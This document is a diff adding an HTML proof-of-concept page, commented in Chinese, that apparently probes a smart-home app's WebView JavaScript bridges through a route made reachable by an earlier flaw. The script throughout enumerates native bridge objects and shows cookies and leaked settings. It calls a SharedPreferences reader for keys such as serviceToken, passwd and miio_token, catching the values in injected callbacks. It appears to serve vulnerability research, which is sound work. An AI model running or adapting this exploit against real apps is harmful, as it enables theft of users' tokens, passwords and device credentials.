@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<style>
+  body{font-family:monospace;padding:10px;background:#fff;color:#000;font-size:13px;line-height:1.55}
+  h3{margin:6px 0;color:#c00}
+  #o{white-space:pre-wrap;word-break:break-all;background:#111;color:#0f0;padding:10px;border-radius:6px;font-size:12px;min-height:200px}
+  .big{font-size:15px;color:#00f}
+</style>
+</head>
+<body>
+<h3>vuln1 WebView 额外桥探测（/main 路由，vuln1 已证可达）</h3>
+<pre id="o">running...</pre>
+<script>
+var o=document.getElementById("o"), L=[];
+function p(s){L.push(s);o.innerText=L.join("\n");}
+function t(fn){try{return fn();}catch(e){return"ERR:"+e;}}
+
+// ---- 异步回调捕获：定义各种可能的回调名 + 拦截 ----
+["onResult","onGetValueFromSP","callback","onCallback","_handleMessageFromNative","onData","cb"].forEach(function(n){
+  window[n]=function(d){p("[<-异步回调 "+n+"] "+(typeof d==="string"?d:JSON.stringify(d)).slice(0,500));};
+});
+
+p("[环境]");
+p("UA: "+t(function(){return navigator.userAgent;}));
+p("URL: "+t(function(){return location.href;}));
+p("cookie: "+t(function(){return document.cookie;}));
+
+// ---- 桥存在性 + 方法枚举 ----
+var B={};
+["_native_interface","_cloud_video_interface","mihomeJsBridge","MJApi","statusBarApi","refreshRefInfo","recordEventInfo"].forEach(function(n){
+  B[n]=t(function(){return window[n]!==undefined;});
+  if(window[n]!==undefined){
+    var keys=t(function(){return Object.keys(window[n]).join(",");});
+    p("✓ "+n+" 方法: "+keys);
+  }
+});
+p("\n桥存在: "+JSON.stringify(B));
+
+// ---- _native_interface 额外同步泄露方法（vuln1 没测的）----
+var ni=window._native_interface;
+if(ni){
+  p("\n=== _native_interface 同步泄露 ===");
+  ["getSettings","isLogin","getLocale","getNetworkType","getActiveIds","getCouponResult","webviewStatus"].forEach(function(m){
+    t(function(){
+      if(typeof ni[m]==="function"){
+        var r=ni[m]();
+        p("  "+m+"() => "+(typeof r==="string"?r:String(r)).slice(0,400));
+      }
+    });
+  });
+  // openNewWebView 链式（注释掉，避免真开窗口；如需测可取消注释）
+  // t(function(){ni.openNewWebView&&ni.openNewWebView("https://example.com");});
+}
+
+// ---- _cloud_video_interface：读 SharedPreferences + 摄像头 ----
+var cv=window._cloud_video_interface;
+if(cv){
+  p("\n=== _cloud_video_interface ===");
+  p("  方法: "+t(function(){return Object.keys(cv).join(",");}));
+  // getValueFromSP 读各种敏感 key（异步，靠回调捕获）
+  ["serviceToken","userId","token","account","passwd","miio_token","service_token","appid","deviceId","machineCode","user_id"].forEach(function(k){
+    t(function(){if(typeof cv.getValueFromSP==="function")cv.getValueFromSP(k,"");});
+  });
+  p("  [已调用 getValueFromSP 读 11 个 key，等异步回调 ↑]");
+}
+
+// ---- mihomeJsBridge ----
+if(window.mihomeJsBridge){
+  p("\n=== mihomeJsBridge ===");
+  p("  方法: "+t(function(){return Object.keys(window.mihomeJsBridge).join(",");}));
+}
+
+p("\n[初始完成，等待异步回调注入... 5秒后定格]");
+setTimeout(function(){p("\n[定格] 请截图本页");},5000);
+</script>
+</body>
+</html>
